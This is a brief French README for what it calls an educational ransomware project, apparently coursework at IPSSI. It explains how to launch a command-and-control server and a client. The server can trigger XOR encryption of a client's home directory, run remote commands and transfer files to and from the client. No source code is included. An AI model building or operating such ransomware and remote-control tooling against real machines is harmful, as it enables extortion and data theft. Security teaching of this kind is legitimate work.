# Projet : ransomware pédagogique IPSSI

## Lancer le serveur
```
python server.py 0.0.0.0 5000
```
Commandes dans le terminal du serveur :
- list
- xor <id>
- exec <id> <commande>
- get <id> <chemin_client>
- put <id> <fichier_local> <destination_client>

Les fichiers recus sont places dans `downloads/<id>/`.

## Lancer le client
```
python client.py <ip_serveur> <port>
```
Le client envoie HELLO (uuid + cle), attend les ordres, et peut :
- proteger le home (XOR)
- executer une commande simple
- envoyer / recevoir un fichier
